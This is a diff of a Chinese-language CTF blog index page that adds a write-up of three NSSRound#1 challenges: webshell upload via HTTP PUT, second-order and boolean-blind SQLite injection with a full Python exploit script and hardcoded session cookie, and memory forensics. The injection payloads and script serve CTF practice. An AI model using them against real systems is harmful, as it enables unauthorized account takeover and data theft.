@@ -263,6 +263,178 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/%E3%80%90NSSRound-1-Basic%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/04/03/%E3%80%90NSSRound-1-Basic%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/" itemprop="url">【NSSRound#1 Basic】赛后复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-04-03T13:30:05+08:00">
+                2022-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>睡过了忘记了，起来都快结束了，就简单做了下取证还没做完（，赶紧来复现下。</p>
+</blockquote>
+<h1 id="basic-check"><a href="#basic-check" class="headerlink" title="basic_check"></a>basic_check</h1><p>这题出的好，考察了http协议的知识，我都忘光了都，也提醒自己基础一定要扎实。</p>
+<p>进入网页约等于啥都没有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__);// Welcome to NSSCTF Round#1 Basic, have fun. </span><br></pre></td></tr></table></figure>
+
+<p>这里要用到OPTIONS请求方法查看允许的请求方式：<br><img src="https://s2.loli.net/2022/04/03/9cFq2tnaWTdwPL8.png"></p>
+<p>发现PUT方法，那么就简单了，我们只需要PUT进一个一句马即可：<br><img src="https://s2.loli.net/2022/04/03/KsGy9Cw875uheP6.png"></p>
+<p>获取webshell：<br><img src="https://s2.loli.net/2022/04/03/Sr48lI5XGMFwqj2.png"></p>
+<p>根目录读取flag即可。</p>
+<h1 id="sql-by-sql"><a href="#sql-by-sql" class="headerlink" title="sql_by_sql"></a>sql_by_sql</h1><p>进去发现注册登录，盲猜二次注入，我们先随便注册然后登录，发现可以修改密码，我们在修改密码的页面的源码中发现了sql语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set password=&#x27;%s&#x27; where username=&#x27;%s&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>确实是二次注入，我们只需要注册一个账户名为<code>admin&#39;--+</code>的用户，结合sql语句就可以做到改<code>admin</code>的密码。</p>
+<p>因此更改admin密码登录，登陆后发现可以查询用户id，这里根据用户是否存在存在一个布尔盲注。</p>
+<p>根据fuzz判断这里不是mysql，应该是sqlite注入，exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">strs = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.,-&#123;&#125; &quot;</span><br><span class="line">url = &quot;http://1.14.71.254:28467/query&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line">headers = &#123;&#x27;Cookie&#x27;: &#x27;session=eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.YklOVg.Pz554uNEiaxxBCpP4pm7-G8iucg&#x27;&#125;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,100):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            #表+字段</span><br><span class="line">            #payload = &quot;1 and substr((select sql from sqlite_master limit 1,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j)</span><br><span class="line">            #数据</span><br><span class="line">            payload = &quot;1 and substr((select flag from flag limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j)</span><br><span class="line">            data = &#123;&quot;id&quot;: payload&#125;</span><br><span class="line">            r = s.post(url=url, data=data, headers=headers)</span><br><span class="line">            #print(r.text)</span><br><span class="line">            if &quot;exist&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;%&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>这题主要是初识sqlite了，不过大体上和mysql也是相差不大，主要是一些函数的区别吧。</p>
+<h1 id="cut-into-thirds"><a href="#cut-into-thirds" class="headerlink" title="cut_into_thirds"></a>cut_into_thirds</h1><p>取证题，其实难度不高，但是因为我的工具没法装mimikatz插件就很淦，后来用了另一个工具把第三部分密码爆出来的。</p>
+<p>整体思路就是filescan找到LookAtMe.zip，解压得到第一部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">part1:3930653363343839</span><br></pre></td></tr></table></figure>
+
+<p>接着pslist查运行程序，发现LookAtme.exe，dump下来strings找到第二部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">part2:GRRGGYJNGQ4GKMBNMJRTONI=</span><br></pre></td></tr></table></figure>
+
+<p>最后一个部分藏在ctf用户的密码中，没有插件就用Passware Kit Forensic一把嗦，找到第三部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">part3:MTEwOTFmNWI3ZTNh</span><br></pre></td></tr></table></figure>
+
+<p>分别解码base16、base32、base64即可。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/27/%E3%80%90NISACTF%E3%80%91write-up/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1582,154 +1754,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/05/%E7%89%B9%E6%AE%8Awebshell%E7%9A%84%E6%9E%84%E5%BB%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mrl64's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/03/05/%E7%89%B9%E6%AE%8Awebshell%E7%9A%84%E6%9E%84%E5%BB%BA/" itemprop="url">特殊webshell的构建</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-05T14:44:09+08:00">
-                2022-03-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>这个坑就直接填了吧，毕竟这东西还是很有意思的，而且对很多waf都可以起到很好的效果。</p>
-</blockquote>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2022/03/05/%E7%89%B9%E6%AE%8Awebshell%E7%9A%84%E6%9E%84%E5%BB%BA/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1780,7 +1804,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">59</span>
+                  <span class="site-state-item-count">60</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
